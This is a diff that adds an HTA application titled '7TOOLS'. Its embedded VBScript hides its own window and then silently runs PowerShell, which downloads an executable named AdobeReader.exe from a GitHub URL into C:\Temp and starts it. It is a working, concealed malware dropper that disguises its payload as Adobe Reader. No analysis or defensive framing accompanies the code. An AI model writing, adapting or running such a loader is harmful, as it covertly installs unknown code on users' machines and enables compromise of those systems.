@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>7TOOLS</title>
+    <hta:application 
+        applicationname="7TOOLS"
+        version="1.0"
+        maximizebutton="no"
+        minimizebutton="no"
+        border="none"
+        caption="no"
+        windowstate="minimize"
+        showintaskbar="no"
+        singleinstance="yes"
+        sysmenu="no"
+        contextmenu="no"
+        selection="no"
+        innerborder="no"
+        scroll="no"
+    />
+</head>
+<body>
+<script language="VBScript">
+On Error Resume Next
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+window.resizeTo 0, 0
+window.moveTo -10000, -10000
+document.body.style.display = "none"
+
+Dim url, exe, cmd
+url = "https://github.com/rexonlinerex/adobereader/raw/refs/heads/main/AdobeReader.exe"
+exe = "C:\Temp\AdobeReader.exe"
+
+cmd = "powershell -Command ""mkdir C:\Temp -Force | Out-Null; Invoke-WebRequest -Uri '" & url & "' -OutFile '" & exe & "' -UseBasicParsing; Start-Process '" & exe & "'"""
+
+shell.Run cmd, 0, False
+WScript.Sleep 2000
+window.close
+</script>
+</body>
+</html>
